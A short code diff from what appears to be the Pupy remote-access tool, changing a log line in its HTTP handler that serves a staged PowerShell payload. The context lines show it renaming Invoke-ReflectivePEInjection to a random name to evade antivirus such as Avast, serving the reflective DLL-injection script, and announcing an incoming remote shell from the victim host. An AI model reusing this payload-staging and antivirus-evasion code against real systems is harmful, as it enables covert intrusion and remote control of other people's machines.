@@ -114,7 +114,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
             self.wfile.write(getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf))
             print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
-            print colorize("[+] ","green")+"You should have a pupy shell in few seconds from this host..."
+            print colorize("[+] ","green")+colorize("%s:You should have a pupy shell in few seconds from this host..."%self.client_address[0],"green")
 
         else:
             self.send_response(404)
